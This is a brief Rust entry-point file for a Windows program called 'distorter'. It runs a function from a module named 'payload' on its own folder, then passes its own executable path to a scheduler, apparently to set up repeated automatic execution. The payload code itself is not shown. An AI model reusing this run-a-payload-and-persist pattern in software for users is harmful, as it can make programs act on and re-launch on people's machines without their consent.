use std::env;
use windows::core::Result;

use distorter::payload::distort;
use distorter::scheduler::schedule;

fn main() -> Result<()> {
    let exe_path = &env::current_exe().unwrap();

    distort(exe_path.parent().unwrap());
    schedule( String::from(&exe_path.display().to_string()))?;

    Ok(())
}
